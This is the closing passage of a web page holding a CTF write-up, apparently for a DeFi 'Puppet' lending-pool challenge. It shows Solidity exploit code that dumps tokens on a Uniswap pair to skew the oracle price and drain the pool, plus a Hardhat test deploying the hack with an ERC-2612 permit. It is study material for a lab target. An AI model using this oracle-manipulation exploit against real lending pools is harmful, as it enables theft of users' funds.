<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">uniswapPair</span><span class="p">(),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
<span class="w">        </span><span class="nx">UniswapExchangeInterface</span><span class="p">(</span><span class="nx">pool</span><span class="p">.</span><span class="nx">uniswapPair</span><span class="p">()).</span><span class="nx">tokenToEthSwapInput</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span><span class="w">   </span><span class="c1">// since the contract is not deployed, ETH can be sent directly to the address</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">borrow</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">}(</span><span class="mf">100000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">signERC2612Permit</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;eth-permit&#39;</span><span class="p">);</span>

<span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hackFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;PuppetPoolHack&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">);</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">hackAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">getContractAddress</span><span class="p">({</span>
<span class="w">        </span><span class="kr">from</span><span class="o">:</span><span class="w"> </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
<span class="w">        </span><span class="nx">nonce</span><span class="o">:</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">player</span><span class="p">.</span><span class="nx">getTransactionCount</span><span class="p">()</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">signERC2612Permit</span><span class="p">(</span>
<span class="w">        </span><span class="nx">player</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="nx">player</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span>
<span class="w">        </span><span class="nx">hackAddress</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="nx">PLAYER_INITIAL_TOKEN_BALANCE</span>
<span class="w">    </span><span class="p">);</span><span class="w">        </span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">hackFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span>
<span class="w">        </span><span class="nx">lendingPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span>
<span class="w">        </span><span class="nx">signature</span><span class="p">.</span><span class="nx">v</span><span class="p">,</span>
<span class="w">        </span><span class="nx">signature</span><span class="p">.</span><span class="nx">r</span><span class="p">,</span>
<span class="w">        </span><span class="nx">signature</span><span class="p">.</span><span class="nx">s</span><span class="p">,</span>
<span class="w">        </span><span class="nx">signature</span><span class="p">.</span><span class="nx">deadline</span><span class="p">,</span>
<span class="w">        </span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mi">10n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10n</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">18n</span><span class="p">,</span><span class="w"> </span><span class="nx">gasLimit</span><span class="o">:</span><span class="w"> </span><span class="mf">10</span><span class="o">**</span><span class="mf">6</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.uniswap.org/contracts/v1/reference/exchange">Exchange | Uniswap</a></li>
<li><a href="https://soliditydeveloper.com/erc20-permit#frontend-usage">A Long Way To Go:¬†On Gasless Tokens and ERC20-Permit</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      ÊúÄÂêéÊõ¥Êñ∞:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023Âπ¥10Êúà11Êó• 18:46:44</span>
      
    
  </small>
</div>

              

  
    <div class="md-source-date">
      <small>
          <span class="twemoji">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
          </span>
          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
      </small>
      <br>
      <small>
          <span id="busuanzi_container_page_pv">
            <span class="twemoji">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
            </span>
            Pageviews: <span id="busuanzi_value_page_pv"></span>
          </span>
      </small>
    </div>
  
  
  <!-- Giscus -->
  <h2 id="__comments">ËØÑËÆ∫</h2>
  <script src="https://giscus.app/client.js"
      data-repo="YanhuiJessica/Chictf-Writeups"
      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
      data-category="General"
      data-category-id="DIC_kwDODtAMDc4CP_N3"
      data-mapping="title"
      data-reactions-enabled="1"
      data-emit-metadata="0"
      data-input-position="top"
      data-theme="light"
      data-lang="zh-CN"
      data-loading="lazy"
      crossorigin="anonymous"
      async>
  </script>

  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    /* Set palette on initial load */
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate" ? "dark" : "light"
      giscus.setAttribute("data-theme", theme)
    }

    /* Register event handlers after documented loaded */
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate" ? "dark" : "light"

          /* Instruct Giscus to change theme */
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

            </article>
            
          </div>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            ÂõûÂà∞È°µÈù¢È°∂ÈÉ®
          </a>
        
      </main>
      
        <footer class="md-footer">
  
    
    <nav class="md-footer__inner md-grid" aria-label="È°µËÑö" >
      
        
        <a href="../ethernaut/" class="md-footer__link md-footer__link--prev" aria-label="‰∏ä‰∏ÄÈ°µ: Ethernaut" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                ‰∏ä‰∏ÄÈ°µ
              </span>
              Ethernaut
            </div>
          </div>
        </a>
      
      
        
        <a href="../quillctf/slot_puzzle/" class="md-footer__link md-footer__link--next" aria-label="‰∏ã‰∏ÄÈ°µ: Slot Puzzle" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                ‰∏ã‰∏ÄÈ°µ
              </span>
              Slot Puzzle
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2020 - 2022 YanhuiJessica
    </div>
  
  
</div>
      
        <div class="md-social">
  
    
    
      
      
    
    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.f758a944.min.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
    
  </body>
</html>